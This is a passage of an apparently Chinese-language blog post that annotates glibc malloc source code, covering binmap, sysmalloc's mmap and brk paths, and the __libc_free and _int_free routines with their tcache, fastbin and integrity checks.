class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Binmap</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    To help compensate for the large number of bins, a one-level index</span></span><br><span class="line"><span class="comment">    structure is used for bin-by-bin searching.  `binmap&#x27; is a</span></span><br><span class="line"><span class="comment">    bitvector recording whether bins are definitely empty so they can</span></span><br><span class="line"><span class="comment">    be skipped over during during traversals.  The bits are NOT always</span></span><br><span class="line"><span class="comment">    cleared as soon as bins are empty, but instead only</span></span><br><span class="line"><span class="comment">    when they are noticed to be empty during traversal in malloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conservatively use 32 bits per map word, even if on 64bit system */</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line"> <span class="comment">// 每次都会有简单的判断，如果binmap对应位明明为1，但是实际上对应的bin是空的</span></span><br><span class="line"> <span class="comment">// 那么就说明binmap信息过期了，更新一下binmap</span></span><br><span class="line"> <span class="keyword">if</span> (victim == bin) </span><br><span class="line">    &#123;</span><br><span class="line">       av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">       bin = next_bin (bin);</span><br><span class="line">       bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><h2 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h2><p>根据上面的流程，当内存不足时，程序就需要调用sysmalloc，向内核申请更多的内存</p><p>其中申请内存的方法分为两种，mmap和brk</p><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p>当满足如下条件时，sysmalloc会调用mmap来扩展内存</p><ul><li>系统支持mmap</li><li>实际需要分配的堆块大小大于<code>mmap threshold</code>,这个值在程序中为<strong>128*1024=128kb</strong></li><li>已经mmap的区域个数需要小于其上限<code>mp_.n_mmaps_max</code>,这个值在程序中为<strong>65536</strong></li></ul><p>相关的宏和代码如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"> DEFAULT_MXFAST             <span class="number">64</span> (<span class="keyword">for</span> <span class="number">32b</span>it), <span class="number">128</span> (<span class="keyword">for</span> <span class="number">64b</span>it)</span><br><span class="line"> DEFAULT_TRIM_THRESHOLD     <span class="number">128</span> * <span class="number">1024</span></span><br><span class="line"> DEFAULT_TOP_PAD            <span class="number">0</span></span><br><span class="line"> DEFAULT_MMAP_THRESHOLD     <span class="number">128</span> * <span class="number">1024</span></span><br><span class="line"> DEFAULT_MMAP_MAX           <span class="number">65536</span></span><br><span class="line">   </span><br><span class="line"> <span class="comment">/* There is only one instance of the malloc parameters.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> <span class="title">mp_</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">  .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">  .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span></span><br><span class="line">  .arena_test = NARENAS_FROM_NCORES (<span class="number">1</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  ,</span><br><span class="line">  .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">  .tcache_bins = TCACHE_MAX_BINS,</span><br><span class="line">  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="number">-1</span>),</span><br><span class="line">  .tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     If have mmap, and the request size meets the mmap threshold, and</span></span><br><span class="line"><span class="comment">     the system supports mmap, and there are few enough currently</span></span><br><span class="line"><span class="comment">     allocated mmapped regions, try to directly map this request</span></span><br><span class="line"><span class="comment">     rather than expanding top.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">      || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold)</span><br><span class="line">  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line">    <span class="comment">// 尝试映射一块额外内存</span></span><br><span class="line">    try_mmap:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Round up size to nearest page.  For mmapped chunks, the overhead</span></span><br><span class="line"><span class="comment">         is one SIZE_SZ unit larger than for normal chunks, because there</span></span><br><span class="line"><span class="comment">         is no following chunk whose prev_size field could be used.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         See the front_misalign handling below, for glibc there is no</span></span><br><span class="line"><span class="comment">         need for further alignments unless we have have high alignment.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">        size = ALIGN_UP (nb + SIZE_SZ, pagesize);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        size = ALIGN_UP (nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);</span><br><span class="line">      tried_mmap = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Don&#x27;t try if size wraps around 0 */</span></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          mm = (<span class="keyword">char</span> *) (MMAP (<span class="number">0</span>, size, PROT_READ | PROT_WRITE, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (mm != MAP_FAILED)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 The offset to the start of the mmapped region is stored</span></span><br><span class="line"><span class="comment">                 in the prev_size field of the chunk. This allows us to adjust</span></span><br><span class="line"><span class="comment">                 returned start address to meet alignment requirements here</span></span><br><span class="line"><span class="comment">                 and in memalign(), and still be able to compute proper</span></span><br><span class="line"><span class="comment">                 address argument for later munmap in free() and realloc().</span></span><br><span class="line"><span class="comment">               */</span></span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* For glibc, chunk2mem increases the address by 2*SIZE_SZ and</span></span><br><span class="line"><span class="comment">                     MALLOC_ALIGN_MASK is 2*SIZE_SZ-1.  Each mmap&#x27;ed area is page</span></span><br><span class="line"><span class="comment">                     aligned and therefore definitely MALLOC_ALIGN_MASK-aligned.  */</span></span><br><span class="line">                  assert (((INTERNAL_SIZE_T) chunk2mem (mm) &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);</span><br><span class="line">                  front_misalign = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                front_misalign = (INTERNAL_SIZE_T) chunk2mem (mm) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">              <span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                  correction = MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">                  p = (mchunkptr) (mm + correction);</span><br><span class="line">  set_prev_size (p, correction);</span><br><span class="line">                  set_head (p, (size - correction) | IS_MMAPPED);</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  p = (mchunkptr) mm;</span><br><span class="line">  set_prev_size (p, <span class="number">0</span>);</span><br><span class="line">                  set_head (p, size | IS_MMAPPED);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* update statistics */</span></span><br><span class="line"></span><br><span class="line">              <span class="keyword">int</span> <span class="keyword">new</span> = atomic_exchange_and_add (&amp;mp_.n_mmaps, <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">              atomic_max (&amp;mp_.max_n_mmaps, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">              <span class="keyword">unsigned</span> <span class="keyword">long</span> sum;</span><br><span class="line">              sum = atomic_exchange_and_add (&amp;mp_.mmapped_mem, size) + size;</span><br><span class="line">              atomic_max (&amp;mp_.max_mmapped_mem, sum);</span><br><span class="line"></span><br><span class="line">              check_chunk (av, p);</span><br><span class="line"></span><br><span class="line">              <span class="keyword">return</span> chunk2mem (p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h3><p>当不满足mmap的条件时，那么程序就会尝试使用brk，尝试通过抬高brk的方式来拓展堆内存</p><p>当程序刚开始运行时堆的起始地址<code>start_brk</code>以及堆的当前末尾<code>brk</code>指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同</p><ul><li>不开启 ASLR 保护时，<code>start_brk</code> 以及 <code>brk</code> 会指向 <code>data/bss</code>段的结尾。</li><li>开启 ASLR 保护时，<code>start_brk</code> 以及 <code>brk</code>也会指向同一位置，只是这个位置是在 <code>data/bss</code> 段结尾后的随机偏移处。</li></ul><p>如下图</p><p><img src="/image/malloc/brk.png" alt="brk"></p><p>具体细节暂时不是重点，可以参看ctf-wiki上的大致介绍 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/malloc-zh/#sysmalloc">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/malloc-zh/#sysmalloc</a></p><h1 id="Free"><a href="#Free" class="headerlink" title="Free"></a>Free</h1><p>讲讲free的流程</p><h2 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h2><p>和malloc一样，实际上我们调用free也不是调用free函数，而是调用了<code>__libc_free</code>函数</p><p>当我们free掉一个堆块时，步骤如下</p><p>首先和malloc一样，先检查是否存在用户自定义的hook函数，如果存在，调用hook函数后返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>检查mem指针是否是空指针，如果是空指针，直接返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><p>检查需要释放的堆块是否是mmap出来的，如果是，调用<code>munmap_chunk</code>函数释放</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span></span><br><span class="line"><span class="comment"> Dumped fake mmapped chunks do not affect the threshold.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX</span><br><span class="line">  &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p))</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>不是的话，和malloc一样，调用<code>_int_free</code>函数</p><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><p>首先<code>_int_free</code>函数判断指针是否非法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line">  <span class="comment">// 这里-size没太懂</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid pointer&quot;</span>);</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">  <span class="comment">// 确保指针必须是对齐的，并且堆块大小一定大于等于MINSIZE</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid size&quot;</span>);</span><br></pre></td></tr></table></figure><p>如果使用了tcache，判断堆块大小是否在tcache范围内，如果在范围内，则放入tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>如果没放入tcache，考虑fastbins</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">    and used quickly in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS  <span class="comment">// TRIM_FASTBINS默认为0，此宏为1表示如果释放的堆块与在topchunk的低地址处，那么禁止将其放入fastbins中</span></span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      ) &#123;</span><br><span class="line">    <span class="comment">// 这里检查了两个东西</span></span><br><span class="line">    <span class="comment">// 首先与待释放的堆块相邻的下一个堆块大小不可小于2 * SIZE_SZ</span></span><br><span class="line">    <span class="comment">// 同时大小也不可大于av-&gt;system_mem，这个数一般是132kb</span></span><br><span class="line">    <span class="comment">// 如果出现上述两种情况，就直接报错</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))</span><br><span class="line">  &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line"><span class="keyword">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might result in a false positive.  Redo the test after</span></span><br><span class="line"><span class="comment">   getting the lock.  */</span></span><br><span class="line">  <span class="comment">// 为了防止由于有别的线程正在修改arena中的值，导致system_mem错误</span></span><br><span class="line">  <span class="comment">// 尝试获得锁，然后重新检查是否出现上面说的两种情况</span></span><br><span class="line"><span class="keyword">if</span> (!have_lock)</span><br><span class="line">  &#123;</span><br><span class="line">    __libc_lock_lock (av-&gt;mutex);</span><br><span class="line">    fail = (chunksize_nomask (chunk_at_offset (p, size)) &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">    __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fail)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): invalid next size (fast)&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">// 清空堆块数据段，将其置为perturb_byte，默认为0</span></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="comment">// 如果只有一个线程</span></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">   add (i.e., double free).  */</span></span><br><span class="line">      <span class="comment">// 检查是否我们尝试插入的堆块与fastbins对应的bin的第一个堆块相同</span></span><br><span class="line">      <span class="comment">// 防止double free的发生</span></span><br><span class="line">      <span class="comment">// 如果不相同，插入我们的堆块至fastbins对应的bin</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">p-&gt;fd = old;</span><br><span class="line">*fb = p;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">     add (i.e., double free).  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">  p-&gt;fd = old2 = old;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))</span><br><span class="line">     != old2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">       size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">       only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">       allocated again.  */</span></span><br><span class="line">    <span class="comment">// 确保插入前后chunk相同</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span></span><br><span class="line">&amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;invalid fastbin entry (free)&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果不放入fastbins，那么考虑合并堆块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 